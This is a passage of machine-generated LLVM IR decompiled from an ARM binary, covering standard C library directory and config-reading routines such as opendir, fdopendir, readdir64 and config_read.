  %v1_1886c = add i32 %v0_1886c, 20
  %v2_1886c = inttoptr i32 %v1_1886c to i32*
  %v3_1886c = load i32, i32* %v2_1886c, align 4
  store i32 %v3_1886c, i32* %r1.global-to-local, align 4
  %v2_18874 = call i32 @calloc(i32 1, i32 %v3_1886c)
  %v2_18878 = icmp eq i32 %v2_18874, 0
  store i32 %v2_18874, i32* @r4, align 4
  %v1_18880 = load i32, i32* @r5, align 4
  %v2_18880 = add i32 %v1_18880, 12
  %v3_18880 = inttoptr i32 %v2_18880 to i32*
  store i32 %v2_18874, i32* %v3_18880, align 4
  br i1 %v2_18878, label %dec_label_pc_18888, label %dec_label_pc_18898

dec_label_pc_18888:                               ; preds = %bb17
  %v0_18888 = load i32, i32* @r5, align 4
  store i32 %v0_18888, i32* @r0, align 4
  %v0_1888c = call i32 @free()
  %v0_18890 = load i32, i32* @r4, align 4
  br label %dec_label_pc_188d0

dec_label_pc_18898:                               ; preds = %bb17
  %v0_1889c = load i32, i32* @r6, align 4
  %v2_1889c = add i32 %v0_1889c, -33076
  store i32 %v2_1889c, i32* %r3.global-to-local, align 4
  %v1_188a4 = inttoptr i32 %v2_1889c to i32*
  %v2_188a4 = load i32, i32* %v1_188a4, align 4
  %v3_188a4 = add i32 %v0_1889c, -33072
  %v4_188a4 = inttoptr i32 %v3_188a4 to i32*
  %v5_188a4 = load i32, i32* %v4_188a4, align 4
  store i32 %v5_188a4, i32* %r1.global-to-local, align 4
  %v6_188a4 = add i32 %v0_1889c, -33068
  %v7_188a4 = inttoptr i32 %v6_188a4 to i32*
  %v8_188a4 = load i32, i32* %v7_188a4, align 4
  store i32 %v8_188a4, i32* %r2.global-to-local, align 4
  %v9_188a4 = add i32 %v0_1889c, -33064
  %v10_188a4 = inttoptr i32 %v9_188a4 to i32*
  %v11_188a4 = load i32, i32* %v10_188a4, align 4
  store i32 %v11_188a4, i32* %r3.global-to-local, align 4
  %v12_188a4 = add i32 %v0_1889c, -33060
  %v1_188b0 = inttoptr i32 %v12_188a4 to i32*
  %v2_188b0 = load i32, i32* %v1_188b0, align 4
  %v3_188b0 = add i32 %v0_1889c, -33056
  %v4_188b0 = inttoptr i32 %v3_188b0 to i32*
  %v5_188b0 = load i32, i32* %v4_188b0, align 4
  store i32 %v2_188b0, i32* %stack_var_-32, align 4
  store i32 %v5_188a4, i32* %r1.global-to-local, align 4
  store i32 %v8_188a4, i32* %r2.global-to-local, align 4
  store i32 %v11_188a4, i32* %r3.global-to-local, align 4
  %v0_188c0 = load i32, i32* @r5, align 4
  %v1_188c0 = add i32 %v0_188c0, 24
  %v1_188c4 = inttoptr i32 %v1_188c0 to i32*
  store i32 %v2_188a4, i32* %v1_188c4, align 4
  %v3_188c4 = add i32 %v0_188c0, 28
  %v4_188c4 = inttoptr i32 %v3_188c4 to i32*
  %v5_188c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_188c4, i32* %v4_188c4, align 4
  %v6_188c4 = add i32 %v0_188c0, 32
  %v7_188c4 = inttoptr i32 %v6_188c4 to i32*
  %v8_188c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_188c4, i32* %v7_188c4, align 4
  %v9_188c4 = add i32 %v0_188c0, 36
  %v10_188c4 = inttoptr i32 %v9_188c4 to i32*
  %v11_188c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_188c4, i32* %v10_188c4, align 4
  %v12_188c4 = add i32 %v0_188c0, 40
  %v2_188c8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_188b0, i32* %r1.global-to-local, align 4
  %v1_188cc = inttoptr i32 %v12_188c4 to i32*
  store i32 %v2_188c8, i32* %v1_188cc, align 4
  %v3_188cc = add i32 %v0_188c0, 44
  %v4_188cc = inttoptr i32 %v3_188cc to i32*
  %v5_188cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_188cc, i32* %v4_188cc, align 4
  %v0_188d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_188d0

dec_label_pc_188d0:                               ; preds = %bb, %dec_label_pc_18888, %dec_label_pc_18898
  %v0_188d0 = phi i32 [ 0, %bb ], [ %v0_18890, %dec_label_pc_18888 ], [ %v0_188d0.pre, %dec_label_pc_18898 ]
  store i32 %v12_18818, i32* @r7, align 4
  ret i32 %v0_188d0

; uselistorder directives
  uselistorder i32 %v2_18874, { 1, 0, 2 }
  uselistorder i32 %v1_1882c, { 2, 1, 6, 0, 4, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_188d0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_188f0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_18918, label %dec_label_pc_18908

dec_label_pc_18908:                               ; preds = %entry
  %v0_18908 = call i32 @__GI___errno_location()
  %v0_1890c = load i32, i32* @r7, align 4
  %v1_1890c = sub i32 0, %v0_1890c
  %v2_18910 = inttoptr i32 %v0_18908 to i32*
  store i32 %v1_1890c, i32* %v2_18910, align 4
  br label %dec_label_pc_1893c

dec_label_pc_18918:                               ; preds = %entry
  %v1_18918 = icmp slt i32 %arg1, 0
  br i1 %v1_18918, label %dec_label_pc_1893c, label %dec_label_pc_18920

dec_label_pc_18920:                               ; preds = %dec_label_pc_18918
  store i32 %v2_188f0, i32* @r1, align 4
  %v0_18924 = call i32 @fstat()
  %v1_18928 = icmp slt i32 %v0_18924, 0
  br i1 %v1_18928, label %dec_label_pc_18930, label %dec_label_pc_18944

dec_label_pc_18930:                               ; preds = %dec_label_pc_18920
  br label %dec_label_pc_1893c

dec_label_pc_1893c:                               ; preds = %dec_label_pc_18930, %dec_label_pc_18918, %dec_label_pc_18908
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18980

dec_label_pc_18944:                               ; preds = %dec_label_pc_18920
  %v0_1894c = load i32, i32* @r7, align 4
  %v3_18950 = call i32 @__GI___fcntl_nocancel(i32 %v0_1894c, i32 2, i32 1)
  %v0_18954 = load i32, i32* @r7, align 4
  %v2_1895c = call i32 @fd_to_DIR(i32 %v0_18954, i32 %tmp)
  store i32 %v2_1895c, i32* %r4.global-to-local, align 4
  %v2_18960 = icmp eq i32 %v2_1895c, 0
  br i1 %v2_18960, label %dec_label_pc_18968, label %dec_label_pc_18980

dec_label_pc_18968:                               ; preds = %dec_label_pc_18944
  %v0_18974 = call i32 @__GI___errno_location()
  %v2_1897c = inttoptr i32 %v0_18974 to i32*
  store i32 12, i32* %v2_1897c, align 4
  %v0_18980.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18980

dec_label_pc_18980:                               ; preds = %dec_label_pc_18944, %dec_label_pc_1893c, %dec_label_pc_18968
  %v0_18980 = phi i32 [ %v2_1895c, %dec_label_pc_18944 ], [ 0, %dec_label_pc_1893c ], [ %v0_18980.pre, %dec_label_pc_18968 ]
  ret i32 %v0_18980

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_18980, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_18998 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_18998, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_189a4 = call i32 @fstat()
  store i32 %v0_189a4, i32* @r5, align 4
  %v2_189a8 = icmp eq i32 %v0_189a4, 0
  br i1 %v2_189a8, label %dec_label_pc_189b0, label %dec_label_pc_18a18

dec_label_pc_189b0:                               ; preds = %entry
  %v1_189b4 = and i32 %tmp4, 61440
  store i32 %v1_189b4, i32* @r3, align 4
  %v7_189b8 = icmp eq i32 %v1_189b4, 16384
  br i1 %v7_189b8, label %dec_label_pc_189d0, label %dec_label_pc_189c0

dec_label_pc_189c0:                               ; preds = %dec_label_pc_189b0
  %v0_189c0 = call i32 @__GI___errno_location()
  br label %dec_label_pc_189fc

dec_label_pc_189d0:                               ; preds = %dec_label_pc_189b0
  %v0_189d0 = load i32, i32* @r4, align 4
  %v2_189d8 = call i32 @__libc_fcntl(i32 %v0_189d0, i32 3)
  %v7_189dc = icmp eq i32 %v2_189d8, -1
  br i1 %v7_189dc, label %dec_label_pc_18a18, label %dec_label_pc_189e4

dec_label_pc_189e4:                               ; preds = %dec_label_pc_189d0
  %v1_189e4 = urem i32 %v2_189d8, 4
  %v7_189e8 = icmp eq i32 %v1_189e4, 1
  br i1 %v7_189e8, label %dec_label_pc_189f0, label %dec_label_pc_18a04

dec_label_pc_189f0:                               ; preds = %dec_label_pc_189e4
  %v0_189f0 = call i32 @__GI___errno_location()
  br label %dec_label_pc_189fc

dec_label_pc_189fc:                               ; preds = %dec_label_pc_189c0, %dec_label_pc_189f0
  %storemerge2 = phi i32 [ %v0_189c0, %dec_label_pc_189c0 ], [ %v0_189f0, %dec_label_pc_189f0 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_189c0 ], [ 22, %dec_label_pc_189f0 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_189fc = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_189fc, align 4
  %v0_18a1c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18a1c

dec_label_pc_18a04:                               ; preds = %dec_label_pc_189e4
  %v0_18a04 = load i32, i32* @r4, align 4
  %v2_18a0c = call i32 @fd_to_DIR(i32 %v0_18a04, i32 %tmp)
  store i32 %v2_18a0c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18a1c

dec_label_pc_18a18:                               ; preds = %entry, %dec_label_pc_189d0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18a1c

dec_label_pc_18a1c:                               ; preds = %dec_label_pc_18a04, %dec_label_pc_189fc, %dec_label_pc_18a18
  %v0_18a1c = phi i32 [ %v2_18a0c, %dec_label_pc_18a04 ], [ %v0_18a1c.pre, %dec_label_pc_189fc ], [ 0, %dec_label_pc_18a18 ]
  ret i32 %v0_18a1c

; uselistorder directives
  uselistorder i32 %v2_189d8, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 6, 0, 5, 10, 9, 8, 7, 4, 3, 2, 1 }
  uselistorder i32 16384, { 12, 0, 13, 5, 6, 7, 3, 4, 1, 2, 8, 9, 10, 11 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_18a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a18, { 1, 0 }
  uselistorder label %dec_label_pc_189fc, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  %v1_18a40 = add i32 %tmp, 24
  store i32 %v1_18a40, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_18a58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  store i32 %v4_18a58, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18a58)
  %v0_18a6c = load i32, i32* @r6, align 4
  %v2_18a6c = add i32 %v0_18a6c, 16
  %v3_18a6c = inttoptr i32 %v2_18a6c to i32*
  %v4_18a6c = load i32, i32* %v3_18a6c, align 4
  store i32 %v4_18a6c, i32* %ip.global-to-local, align 4
  store i32 100984, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18a6c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_18a7c

dec_label_pc_18a7c:                               ; preds = %dec_label_pc_18aac, %entry
  %v0_18a7c = load i32, i32* @r5, align 4
  %v1_18a7c = add i32 %v0_18a7c, 4
  %v2_18a7c = inttoptr i32 %v1_18a7c to i32*
  %v3_18a7c = load i32, i32* %v2_18a7c, align 4
  %v4_18a7c = add i32 %v0_18a7c, 8
  %v5_18a7c = inttoptr i32 %v4_18a7c to i32*
  %v6_18a7c = load i32, i32* %v5_18a7c, align 4
  %tmp10 = icmp ugt i32 %v6_18a7c, %v3_18a7c
  br i1 %tmp10, label %dec_label_pc_18aac, label %dec_label_pc_18a88

dec_label_pc_18a88:                               ; preds = %dec_label_pc_18a7c
  %v1_18a88 = inttoptr i32 %v0_18a7c to i32*
  %v2_18a88 = load i32, i32* %v1_18a88, align 4
  %v1_18a8c = add i32 %v0_18a7c, 12
  %v2_18a8c = inttoptr i32 %v1_18a8c to i32*
  %v3_18a8c = load i32, i32* %v2_18a8c, align 4
  %v1_18a90 = add i32 %v0_18a7c, 20
  %v2_18a90 = inttoptr i32 %v1_18a90 to i32*
  %v3_18a90 = load i32, i32* %v2_18a90, align 4
  %v4_18a94 = inttoptr i32 %v3_18a8c to i32*
  %v5_18a94 = call i32 @__getdents64(i32 %v2_18a88, i32* %v4_18a94, i32 %v3_18a90, i32 %v6_18a7c)
  %tmp9 = icmp slt i32 %v5_18a94, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_18aa4

.thread:                                          ; preds = %dec_label_pc_18a88
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_18adc

dec_label_pc_18aa4:                               ; preds = %dec_label_pc_18a88
  %v1_18aa4 = load i32, i32* @r5, align 4
  %v2_18aa4 = add i32 %v1_18aa4, 8
  %v3_18aa4 = inttoptr i32 %v2_18aa4 to i32*
  store i32 %v5_18a94, i32* %v3_18aa4, align 4
  %v0_18aa8 = load i32, i32* @r7, align 4
  %v1_18aa8 = load i32, i32* @r5, align 4
  %v2_18aa8 = add i32 %v1_18aa8, 4
  %v3_18aa8 = inttoptr i32 %v2_18aa8 to i32*
  store i32 %v0_18aa8, i32* %v3_18aa8, align 4
  %v0_18aac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18aac

dec_label_pc_18aac:                               ; preds = %dec_label_pc_18a7c, %dec_label_pc_18aa4
  %v1_18ad0 = phi i32 [ %v0_18a7c, %dec_label_pc_18a7c ], [ %v0_18aac.pre, %dec_label_pc_18aa4 ]
  %v1_18aac = add i32 %v1_18ad0, 4
  %v2_18aac = inttoptr i32 %v1_18aac to i32*
  %v3_18aac = load i32, i32* %v2_18aac, align 4
  %v1_18ab0 = add i32 %v1_18ad0, 12
  %v2_18ab0 = inttoptr i32 %v1_18ab0 to i32*
  %v3_18ab0 = load i32, i32* %v2_18ab0, align 4
  %v2_18ab4 = add i32 %v3_18ab0, %v3_18aac
  store i32 %v2_18ab4, i32* @r4, align 4
  %v3_18ab8 = inttoptr i32 %v2_18ab4 to i32*
  %v4_18ab8 = load i32, i32* %v3_18ab8, align 4
  %v1_18abc = add i32 %v2_18ab4, 4
  %v2_18abc = inttoptr i32 %v1_18abc to i32*
  %v3_18abc = load i32, i32* %v2_18abc, align 4
  %v1_18ac0 = add i32 %v2_18ab4, 16
  %v2_18ac0 = inttoptr i32 %v1_18ac0 to i16*
  %v3_18ac0 = load i16, i16* %v2_18ac0, align 2
  %v4_18ac0 = zext i16 %v3_18ac0 to i32
  %v1_18ac4 = add i32 %v2_18ab4, 8
  %v2_18ac4 = inttoptr i32 %v1_18ac4 to i32*
  %v3_18ac4 = load i32, i32* %v2_18ac4, align 4
  store i32 %v3_18ac4, i32* %ip.global-to-local, align 4
  %v2_18ac8 = add i32 %v4_18ac0, %v3_18aac
  %v2_18acc = or i32 %v3_18abc, %v4_18ab8
  %v4_18acc = icmp eq i32 %v2_18acc, 0
  store i32 %v2_18ac8, i32* %v2_18aac, align 4
  %v0_18ad4 = load i32, i32* %ip.global-to-local, align 4
  %v1_18ad4 = load i32, i32* @r5, align 4
  %v2_18ad4 = add i32 %v1_18ad4, 16
  %v3_18ad4 = inttoptr i32 %v2_18ad4 to i32*
  store i32 %v0_18ad4, i32* %v3_18ad4, align 4
  br i1 %v4_18acc, label %dec_label_pc_18a7c, label %dec_label_pc_18adc

dec_label_pc_18adc:                               ; preds = %dec_label_pc_18aac, %.thread
  %v0_18ae8 = load i32, i32* @r6, align 4
  %v2_18ae8 = add i32 %v0_18ae8, 24
  %v3_18ae8 = inttoptr i32 %v2_18ae8 to i32*
  %v4_18ae8 = load i32, i32* %v3_18ae8, align 4
  store i32 %v4_18ae8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_18ae8)
  %v0_18af4 = load i32, i32* @r4, align 4
  ret i32 %v0_18af4

; uselistorder directives
  uselistorder i32 %v2_18ab4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_18ad0, { 1, 0 }
  uselistorder i32 %v6_18a7c, { 1, 0 }
  uselistorder i32 %v0_18a7c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_18aac, { 1, 0 }
}

define i32 @function_18b08(i32 %arg1) local_unnamed_addr {
dec_label_pc_18b08:
  %v0_18b08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18b08, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_18b08
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18b08, %bb
  %v10_18b14 = phi i32 [ %arg1, %dec_label_pc_18b08 ], [ 0, %bb ]
  ret i32 %v10_18b14

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 26456)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_18b34 = load i32, i32* @r4, align 4
  %v6_18b34 = load i32, i32* @r5, align 4
  %v9_18b34 = load i32, i32* @r6, align 4
  %v12_18b34 = load i32, i32* @r7, align 4
  %v15_18b34 = load i32, i32* @r8, align 4
  %v18_18b34 = load i32, i32* @sb, align 4
  %v21_18b34 = load i32, i32* @sl, align 4
  %v24_18b34 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_18b38 = icmp eq i32* %arg1, null
  store i1 %v2_18b38, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_18b38, label %dec_label_pc_18e48, label %dec_label_pc_18b50

dec_label_pc_18b50:                               ; preds = %entry
  %v1_18b50 = urem i32 %arg3, 256
  store i32 %v1_18b50, i32* @sb, align 4
  %v1_18b54 = udiv i32 %arg3, 256
  %v3_18b58 = urem i32 %v1_18b54, 256
  %v3_18b5c = mul nuw nsw i32 %v1_18b50, 4
  %v1_18b64 = or i32 %v3_18b5c, 1
  %v1_18b70 = and i32 %arg3, 131072
  %v1_18b74 = add nsw i32 %v1_18b50, -1
  %v1_18b80 = and i32 %arg3, 262144
  store i32 %v1_18b80, i32* %r2.global-to-local, align 4
  %v1_18b84 = and i32 %arg3, 65536
  store i32 %v1_18b84, i32* %r3.global-to-local, align 4
  store i32 %v1_18b84, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_18b94 = add i32 %arg4, 1
  store i32 %v1_18b94, i32* @sl, align 4
  %v2_18d14 = inttoptr i32 %arg2 to i32*
  %v2_18d24 = icmp eq i32 %v1_18b70, 0
  %v2_18d7c = icmp eq i32 %v1_18b80, 0
  br label %dec_label_pc_18b98

dec_label_pc_18b98:                               ; preds = %dec_label_pc_18b98.backedge, %dec_label_pc_18b50
  %v2_18bb4 = phi i32 [ %v0_18b98.pre, %dec_label_pc_18b98.backedge ], [ %tmp, %dec_label_pc_18b50 ]
  %v1_18b98 = add i32 %v2_18bb4, 4
  %v2_18b98 = inttoptr i32 %v1_18b98 to i32*
  %v3_18b98 = load i32, i32* %v2_18b98, align 4
  store i32 %v3_18b98, i32* %r3.global-to-local, align 4
  %v2_18b9c = icmp eq i32 %v3_18b98, 0
  store i1 %v2_18b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b9c, label %dec_label_pc_18ba4, label %dec_label_pc_18bec

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b98
  %v1_18ba4 = add i32 %v2_18bb4, 16
  %v2_18ba4 = inttoptr i32 %v1_18ba4 to i32*
  %v3_18ba4 = load i32, i32* %v2_18ba4, align 4
  store i32 %v3_18ba4, i32* %r3.global-to-local, align 4
  %v2_18ba8 = icmp eq i32 %v3_18ba4, 0
  store i1 %v2_18ba8, i1* %cpsr_z.global-to-local, align 1
  %v1_18bac = add i32 %v2_18bb4, 8
  %v2_18bac = inttoptr i32 %v1_18bac to i32*
  %v3_18bac = load i32, i32* %v2_18bac, align 4
  store i32 %v3_18bac, i32* %r3.global-to-local, align 4
  br i1 %v2_18ba8, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_18ba4
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_18ba4, align 4
  %v0_18bb8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_18ba4, %bb
  %v0_18bb8 = phi i32 [ %v0_18bb8.pre, %bb ], [ %v3_18bac, %dec_label_pc_18ba4 ]
  %v2_18bb8 = icmp eq i32 %v0_18bb8, 0
  store i1 %v2_18bb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bb8, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_18b64, i32* %r3.global-to-local, align 4
  %v2_18bc0 = load i32, i32* @r5, align 4
  %v3_18bc0 = add i32 %v2_18bc0, 8
  %v4_18bc0 = inttoptr i32 %v3_18bc0 to i32*
  store i32 %v1_18b64, i32* %v4_18bc0, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_18bc4 = load i32, i32* @r5, align 4
  %v1_18bc4 = add i32 %v0_18bc4, 16
  %v2_18bc4 = inttoptr i32 %v1_18bc4 to i32*
  %v3_18bc4 = load i32, i32* %v2_18bc4, align 4
  store i32 %v3_18bc4, i32* %r0.global-to-local, align 4
  %v1_18bc8 = add i32 %v0_18bc4, 8
  %v2_18bc8 = inttoptr i32 %v1_18bc8 to i32*
  %v3_18bc8 = load i32, i32* %v2_18bc8, align 4
  store i32 %v3_18bc8, i32* %r3.global-to-local, align 4
  %v2_18bcc = add i32 %v3_18bc8, %v3_18bc4
  store i32 %v2_18bcc, i32* %r0.global-to-local, align 4
  %v1_18bd0 = call i32 @malloc(i32 %v2_18bcc)
  store i32 %v1_18bd0, i32* %r0.global-to-local, align 4
  %v2_18bd4 = icmp eq i32 %v1_18bd0, 0
  store i1 %v2_18bd4, i1* %cpsr_z.global-to-local, align 1
  %v1_18bd8 = load i32, i32* @r5, align 4
  %v2_18bd8 = add i32 %v1_18bd8, 4
  %v3_18bd8 = inttoptr i32 %v2_18bd8 to i32*
  store i32 %v1_18bd0, i32* %v3_18bd8, align 4
  br i1 %v2_18bd4, label %dec_label_pc_18e48, label %dec_label_pc_18be0

dec_label_pc_18be0:                               ; preds = %.thread
  %v0_18be0 = load i32, i32* @r5, align 4
  %v1_18be0 = add i32 %v0_18be0, 20
  %v2_18be0 = inttoptr i32 %v1_18be0 to i32*
  %v3_18be0 = load i32, i32* %v2_18be0, align 4
  %v1_18be4 = or i32 %v3_18be0, 1
  store i32 %v1_18be4, i32* %r3.global-to-local, align 4
  store i32 %v1_18be4, i32* %v2_18be0, align 4
  %v0_18bec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18bec

dec_label_pc_18bec:                               ; preds = %dec_label_pc_18b98, %dec_label_pc_18be0
  %v1_18bf4 = phi i32 [ %v2_18bb4, %dec_label_pc_18b98 ], [ %v0_18bec.pre, %dec_label_pc_18be0 ]
  %v1_18bec = add i32 %v1_18bf4, 4
  %v2_18bec = inttoptr i32 %v1_18bec to i32*
  %v3_18bec = load i32, i32* %v2_18bec, align 4
  store i32 %v3_18bec, i32* %r2.global-to-local, align 4
  %v4_18bec = add i32 %v1_18bf4, 8
  %v5_18bec = inttoptr i32 %v4_18bec to i32*
  %v6_18bec = load i32, i32* %v5_18bec, align 4
  %v2_18bf0 = add i32 %v6_18bec, %v3_18bec
  store i32 %v2_18bf0, i32* %r3.global-to-local, align 4
  %v2_18bf4 = add i32 %v1_18bf4, 12
  %v3_18bf4 = inttoptr i32 %v2_18bf4 to i32*
  store i32 %v2_18bf0, i32* %v3_18bf4, align 4
  %v0_18bf8 = load i32, i32* @fp, align 4
  store i32 %v0_18bf8, i32* @r6, align 4
  br label %dec_label_pc_18bfc

dec_label_pc_18bfc:                               ; preds = %dec_label_pc_18c88, %dec_label_pc_18c74, %dec_label_pc_18bec
  %v0_18c04 = phi i32 [ %v0_18bf8, %dec_label_pc_18bec ], [ %v1_18c74, %dec_label_pc_18c74 ], [ %v0_18c04.pre.pre, %dec_label_pc_18c88 ]
  %v0_18bfc = load i32, i32* @r5, align 4
  %v1_18bfc = add i32 %v0_18bfc, 12
  store i32 %v1_18bfc, i32* %r0.global-to-local, align 4
  %v1_18c00 = inttoptr i32 %v1_18bfc to i32*
  %v2_18c00 = load i32, i32* %v1_18c00, align 4
  store i32 %v2_18c00, i32* %r0.global-to-local, align 4
  %v3_18c00 = add i32 %v0_18bfc, 16
  %v4_18c00 = inttoptr i32 %v3_18c00 to i32*
  %v5_18c00 = load i32, i32* %v4_18c00, align 4
  %v2_18c04 = add i32 %v2_18c00, %v0_18c04
  store i32 %v2_18c04, i32* %r0.global-to-local, align 4
  %v2_18c08 = sub i32 %v5_18c00, %v0_18c04
  %v1_18c0c = inttoptr i32 %v0_18bfc to i32*
  %v2_18c0c = load i32, i32* %v1_18c0c, align 4
  store i32 %v2_18c0c, i32* %r2.global-to-local, align 4
  %v3_18c10 = call i32 @fgets(i32 %v2_18c04, i32 %v2_18c08, i32 %v2_18c0c)
  store i32 %v3_18c10, i32* %r0.global-to-local, align 4
  store i32 %v3_18c10, i32* %r4.global-to-local, align 4
  %v2_18c14 = icmp eq i32 %v3_18c10, 0
  store i1 %v2_18c14, i1* %cpsr_z.global-to-local, align 1
  %v0_18c1c = load i32, i32* @r5, align 4
  %v1_18c1c = add i32 %v0_18c1c, 12
  br i1 %v2_18c14, label %dec_label_pc_18c1c, label %dec_label_pc_18c34

dec_label_pc_18c1c:                               ; preds = %dec_label_pc_18bfc
  store i32 %v1_18c1c, i32* %r0.global-to-local, align 4
  %v1_18c20 = inttoptr i32 %v1_18c1c to i32*
  %v2_18c20 = load i32, i32* %v1_18c20, align 4
  store i32 %v2_18c20, i32* %r0.global-to-local, align 4
  %v3_18c20 = add i32 %v0_18c1c, 16
  %v4_18c20 = inttoptr i32 %v3_18c20 to i32*
  %v5_18c20 = load i32, i32* %v4_18c20, align 4
  store i32 %v5_18c20, i32* @r2, align 4
  %v2_18c28 = inttoptr i32 %v2_18c20 to i8*
  %v3_18c28 = call i32 @__GI_memset(i8* %v2_18c28, i32 0)
  store i32 %v3_18c28, i32* %r0.global-to-local, align 4
  %v0_18c2c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_18c34:                               ; preds = %dec_label_pc_18bfc
  %v2_18c34 = inttoptr i32 %v1_18c1c to i32*
  %v3_18c34 = load i32, i32* %v2_18c34, align 4
  store i32 %v3_18c34, i32* @r4, align 4
  %v1_18c38 = load i32, i32* @r6, align 4
  %v2_18c38 = add i32 %v1_18c38, %v3_18c34
  %v3_18c38 = inttoptr i32 %v2_18c38 to i8*
  store i32 %v2_18c38, i32* %r0.global-to-local, align 4
  %v3_18c3c = call i32 @strlen(i8* %v3_18c38)
  %v0_18c44 = load i32, i32* @r6, align 4
  %v2_18c44 = add i32 %v0_18c44, %v3_18c3c
  store i32 %v2_18c44, i32* @r6, align 4
  %v0_18c48 = load i32, i32* @r4, align 4
  store i32 %v0_18c48, i32* @r0, align 4
  %v2_18c4c = call i32 @__GI_strchr(i32 %v0_18c48, i32 10)
  store i32 %v2_18c4c, i32* %r0.global-to-local, align 4
  %v2_18c50 = icmp eq i32 %v2_18c4c, 0
  store i1 %v2_18c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c50, label %dec_label_pc_18c7c, label %dec_label_pc_18c58

dec_label_pc_18c58:                               ; preds = %dec_label_pc_18c34
  %v1_18c58 = inttoptr i32 %v2_18c4c to i8*
  %v2_18c58 = load i8, i8* %v1_18c58, align 1
  %v3_18c58 = zext i8 %v2_18c58 to i32
  %v1_18c5c = add nuw nsw i32 %v3_18c58, 255
  %v1_18c60 = urem i32 %v1_18c5c, 256
